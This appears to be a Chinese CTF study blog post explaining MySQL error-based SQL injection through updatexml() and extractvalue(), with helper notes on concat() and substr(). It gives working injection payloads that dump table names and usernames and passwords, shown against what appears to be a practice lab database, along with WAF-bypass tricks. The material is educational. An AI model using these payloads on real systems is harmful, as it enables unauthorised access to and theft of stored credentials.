@@ -1,0 +1,669 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL报错注入 | FLYFISH</title><meta name="author" content="FLYFISH"><meta name="copyright" content="FLYFISH"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入分类：  回显正常—-&gt; 联合查询union select  回显报错—&gt;报错注入：  extractvalue() updatexml() floor(rand()\*2)   盲注： 布尔盲注 时间盲注   报错注入（Error-Based Injection）核心原理 适用条件：页面无数据回显，但能返回数据库错误信息。 原理：利用数据库函数执行时的参数校验漏洞，将查询结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL报错注入">
+<meta property="og:url" content="https://flyfish567.github.io/posts/bf58a956.html">
+<meta property="og:site_name" content="FLYFISH">
+<meta property="og:description" content="SQL注入分类：  回显正常—-&gt; 联合查询union select  回显报错—&gt;报错注入：  extractvalue() updatexml() floor(rand()\*2)   盲注： 布尔盲注 时间盲注   报错注入（Error-Based Injection）核心原理 适用条件：页面无数据回显，但能返回数据库错误信息。 原理：利用数据库函数执行时的参数校验漏洞，将查询结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250225164409.bmp">
+<meta property="article:published_time" content="2025-03-01T09:19:01.561Z">
+<meta property="article:modified_time" content="2025-03-01T16:14:38.691Z">
+<meta property="article:author" content="FLYFISH">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250225164409.bmp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL报错注入",
+  "url": "https://flyfish567.github.io/posts/bf58a956.html",
+  "image": "https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164409.bmp",
+  "datePublished": "2025-03-01T09:19:01.561Z",
+  "dateModified": "2025-03-01T16:14:38.691Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "FLYFISH",
+      "url": "https://flyfish567.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://flyfish567.github.io/posts/bf58a956.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL报错注入',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/clock.min.css" /><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="FLYFISH" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgbackground.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-solid fa-image"></i><span> 相册</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164409.bmp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">FLYFISH</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL报错注入</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-solid fa-image"></i><span> 相册</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL报错注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-01T09:19:01.561Z" title="发表于 2025-03-01 17:19:01">2025-03-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-01T16:14:38.691Z" title="更新于 2025-03-02 00:14:38">2025-03-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><strong>SQL注入分类：</strong></p>
+<ul>
+<li><p>回显正常—-&gt; 联合查询<code>union select</code></p>
+</li>
+<li><p>回显报错—&gt;报错注入：</p>
+<ol>
+<li><code>extractvalue()</code></li>
+<li><code>updatexml()</code></li>
+<li><code>floor(rand()\*2)</code></li>
+</ol>
+</li>
+<li><p>盲注：</p>
+<p>布尔盲注</p>
+<p>时间盲注</p>
+</li>
+</ul>
+<h2 id="报错注入（Error-Based-Injection）"><a href="#报错注入（Error-Based-Injection）" class="headerlink" title="报错注入（Error-Based Injection）"></a><strong>报错注入（Error-Based Injection）</strong></h2><h3 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a><strong>核心原理</strong></h3><ul>
+<li><strong>适用条件</strong>：页面无数据回显，但能返回数据库错误信息。</li>
+<li><strong>原理</strong>：利用数据库函数执行时的参数校验漏洞，将查询结果嵌入到错误信息中。</li>
+</ul>
+<h3 id="updatexml-函数报错注入"><a href="#updatexml-函数报错注入" class="headerlink" title="updatexml() 函数报错注入"></a><strong><code>updatexml()</code> 函数报错注入</strong></h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><ul>
+<li><p><strong>函数作用</strong>：修改 XML 文档的指定节点内容。</p>
+</li>
+<li><p>语法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(XML_document, XPath_string, new_value)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>触发错误条件</strong>：当 <code>XPath_string</code> 参数格式非法时（如包含特殊字符 <code>~</code>），函数抛出错误，并将错误信息包含非法内容。</p>
+</li>
+</ul>
+<h4 id="Payload-构造"><a href="#Payload-构造" class="headerlink" title="Payload 构造"></a><strong>Payload 构造</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (查询语句), <span class="number">0x7e</span>), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>关键点</p>
+<ul>
+<li><code>0x7e</code> 是 <code>~</code> 的十六进制，用于分隔错误信息中的目标数据。</li>
+</ul>
+</li>
+<li>将查询结果拼接到第二个参数中，触发 XPath 语法错误。</li>
+</ul>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h4><ul>
+<li><p><strong>获取当前数据库名</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e, database(), 0x7e), 1) --+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong>获取表名</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e), 1) --+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><strong>获取列名</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;), 0x7e), 1) --+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password,ip,time,US&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><strong>获取具体数据</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e, (select group_concat(id,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,username,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,password) from users), 0x7e), 1) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e, substr((select group_concat(id,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,username,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,password) from users),31,30), 0x7e), 1) --+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~1-Dumb-Dumb,2-Angelina-I-kill-y&#x27;</span><br><span class="line">XPATH syntax error: &#x27;~you,3-Dummy-p@ssword,4-secure-~&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><strong>注意事项</strong></h4><ul>
+<li><p>结果长度限制：</p>
+<p>MySQL 报错信息默认最多显示 64 字节，超长结果需用<code>substr()</code></p>
+<p>分段截取：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, substr((<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">1</span>),<span class="number">1</span>,<span class="number">30</span>), <span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>绕过 WAF：</p>
+<p>使用十六进制编码或注释混淆：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="comment">/*!50000SELECT*/</span> database()), <span class="number">0x7e</span>), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="concat-函数"><a href="#concat-函数" class="headerlink" title="concat()函数 "></a><strong><code>concat()函数</code> </strong></h4><p><strong>1. 作用</strong></p>
+<p>将多个字符串或字段值连接成一个字符串。</p>
+<p><strong>2. 语法</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(str1, str2, ..., strN)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>支持任意数量的参数。</li>
+<li>若任一参数为 <code>NULL</code>，则返回结果为 <code>NULL</code>（部分数据库如 MySQL 允许配置修改此行为）。</li>
+</ul>
+<p><strong>3. 示例</strong></p>
+<ul>
+<li><p>基本连接</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> concat(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;World&#x27;</span>); <span class="comment">-- 输出 &#x27;Hello World&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字段拼接</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> concat(username, <span class="string">&#x27;:&#x27;</span>, password) <span class="keyword">FROM</span> users; </span><br><span class="line"><span class="comment">-- 输出 &#x27;admin:123456&#x27;, &#x27;user:qwerty&#x27;...</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>4. 在 SQL 注入中的应用</strong></p>
+<ul>
+<li><p>构造报错信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">SELECT</span> database()), <span class="number">0x7e</span>), <span class="number">1</span>)</span><br><span class="line"><span class="comment">-- 报错信息中显示 &#x27;~database_name~&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>绕过空格过滤</p>
+<p>使用 <code>concat()</code> 代替空格（部分 WAF 会过滤空格）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect&#x27;</span>) <span class="comment">-- 等效于 &#x27;select&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>对比总结</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>函数</strong></th>
+<th style="text-align:left">用途</th>
+<th style="text-align:left">输入</th>
+<th style="text-align:left">输出</th>
+<th style="text-align:left">注入场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>concat()</code></td>
+<td style="text-align:left">横向拼接多个字符串</td>
+<td style="text-align:left">多列或多字符串</td>
+<td style="text-align:left">单行字符串</td>
+<td style="text-align:left">构造错误信息、绕过过滤</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>group_concat()</code></td>
+<td style="text-align:left">纵向合并多行数据为字符串</td>
+<td style="text-align:left">单列多行数据</td>
+<td style="text-align:left">单行字符串（含分隔符）</td>
+<td style="text-align:left">批量提取数据、绕过逐行限制</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a><strong><code>substr()函数</code></strong></h4><p><strong>1.作用</strong></p>
+<p>用于从字符串中提取子字符串。</p>
+<p><strong>2. 基础语法</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(string, start_position [, length])</span><br><span class="line">或<span class="built_in">substring</span>(string, start_position [, length])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>参数说明<ul>
+<li><code>string</code>：要截取的原始字符串（可以是字段名、子查询结果或直接字符串）。</li>
+<li><code>start_position</code>：起始位置（<strong>从 1 开始计数</strong>）。</li>
+<li><code>length</code>（可选）：截取的长度。若省略，则截取到字符串末尾。</li>
+</ul>
+</li>
+</ul>
+<p><strong>3. 返回值</strong></p>
+<ul>
+<li>返回从 <code>start_position</code> 开始、长度为 <code>length</code> 的子字符串。</li>
+<li>若 <code>start_position</code> 为负数，则从字符串末尾倒数（部分数据库支持，如 MySQL）。</li>
+<li>若 <code>start_position</code> 或 <code>length</code> 超出范围，返回空或部分有效字符。</li>
+</ul>
+<p><strong>4. 示例</strong></p>
+<p><strong>(1) 基本用法</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> substr(<span class="string">&#x27;Hello World&#x27;</span>, <span class="number">7</span>, <span class="number">5</span>);  <span class="comment">-- 输出 &#x27;World&#x27;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>从第 7 个字符（<code>W</code>）开始，截取 5 个字符。</li>
+</ul>
+<p><strong>(2) 省略长度</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> substr(<span class="string">&#x27;Hello World&#x27;</span>, <span class="number">7</span>);     <span class="comment">-- 输出 &#x27;World&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>(3) 负数起始位置（MySQL/MariaDB）</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> substr(<span class="string">&#x27;Hello World&#x27;</span>, <span class="number">-5</span>, <span class="number">5</span>); <span class="comment">-- 输出 &#x27;World&#x27;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>从倒数第 5 个字符（<code>W</code>）开始截取。</li>
+</ul>
+<p><strong>5. 在 SQL 注入中的应用</strong></p>
+<p>在报错注入中，<code>substr()</code> 常用于分段提取数据（绕过报错信息长度限制）。</p>
+<p><strong>示例 Payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e, substr((select group_concat(username) from users),1,30), 0x7e),1) --+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>作用</strong>：从 <code>users</code> 表的 <code>username</code> 字段中提取前 30 个字符。</li>
+</ul>
+<p><strong>6. 跨数据库差异</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>数据库</strong></th>
+<th style="text-align:left">语法支持</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>MySQL/MariaDB</strong></td>
+<td style="text-align:left">支持 <code>substr()</code> 和 <code>substring()</code>，负数起始位置有效。</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>PostgreSQL</strong></td>
+<td style="text-align:left">仅支持 <code>substring(string FROM start [FOR length])</code>，起始位置从 1 开始。</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Oracle</strong></td>
+<td style="text-align:left">仅支持 <code>substr()</code>，起始位置从 1 开始。</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>SQL Server</strong></td>
+<td style="text-align:left">使用 <code>substring()</code>，语法同标准 SQL。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>7. 注意事项</strong></p>
+<ol>
+<li><p><strong>起始位置从 1 开始</strong>：<br>若设置为 <code>0</code>，在 MySQL 中会返回空字符串，其他数据库可能报错。</p>
+</li>
+<li><p><strong>中文字符处理</strong>：<br>若字段包含多字节字符（如 UTF-8 中文），<code>substr()</code> 可能按字节截取而非字符，导致乱码。可使用 <code>substring()</code> 的字符模式（部分数据库支持）。</p>
+</li>
+<li><p><strong>结果长度限制</strong>：<br>在报错注入中，需确保截取长度不超过报错信息的显示限制（通常 64 字节）。</p>
+</li>
+<li><p><strong>子查询必须包裹括号</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> ...), <span class="number">1</span>, <span class="number">30</span>)  <span class="comment">-- 正确</span></span><br><span class="line">substr(<span class="keyword">select</span> ..., <span class="number">1</span>, <span class="number">30</span>)    <span class="comment">-- 错误</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h3 id="extractvalue-函数报错注入"><a href="#extractvalue-函数报错注入" class="headerlink" title="extractvalue() 函数报错注入"></a><strong><code>extractvalue()</code> 函数报错注入</strong></h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h4><ul>
+<li><p><strong>函数作用</strong>：从 XML 文档中提取指定节点的值。</p>
+</li>
+<li><p>语法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(XML_document, XPath_string)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>触发错误条件</strong>：当 <code>XPath_string</code> 格式非法时，函数报错并返回非法内容。</p>
+</li>
+</ul>
